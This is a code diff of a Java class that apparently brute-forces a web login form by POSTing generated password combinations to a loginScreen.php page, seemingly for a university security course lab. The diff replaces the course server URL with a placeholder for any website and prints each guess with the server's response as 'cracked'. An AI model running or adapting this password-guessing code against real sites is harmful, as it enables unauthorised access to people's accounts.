@@ -17,7 +17,7 @@ class SubmitPostForm {
         // So, the form page is the same as the action.
         // If they were different, we would use the action for url.
         //URL url = new URL("http://localhost/cs5352pwd/loginScreen.php");
-        URL url = new URL("https://cssrvlab01.utep.edu/Classes/cs5339/longpre/cs5352/loginScreen.php");
+        URL url = new URL("loginScreen.php"); // put url of website
         String combo = "";
         for (int i = 0; i < allowed.length; i++) {
             for (int k = 0; k < allowed.length; k++) {
@@ -52,7 +52,7 @@ class SubmitPostForm {
         conn.getOutputStream().write(postDataBytes);
 
         BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
-        
-        System.out.println(password+" "+in.readLine());
+        String cracked = in.readLine() + in.readLine();
+        System.out.println(password+" "+cracked);
     }
 }
